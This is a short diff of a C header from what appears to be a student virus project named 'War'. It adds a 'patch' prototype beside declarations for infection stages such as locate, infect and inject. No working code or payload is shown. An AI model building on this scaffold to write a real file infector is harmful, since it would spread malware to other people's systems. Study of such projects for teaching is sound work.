@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:26:41 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/04 16:26:31 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/08 16:01:11 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -48,6 +48,7 @@
 # define VERSION	"1.0"
 # define CREATED_BY	"War version "VERSION" (c)oded by Jle-Quel & DjeDt"
 # define CREATE_SZ	43
+
 // debug
 # define DEBUG
 
@@ -124,6 +125,7 @@ void			locate(t_data *data, t_directory *dir);
 void			inspect(t_data *data, char *path);
 void			infect(t_data *data);
 void			inject(t_data *data);
+void			patch(t_data *data, uint8_t *map, size_t size);
 void			release(t_data *data);
 void			end(t_data *data);
 
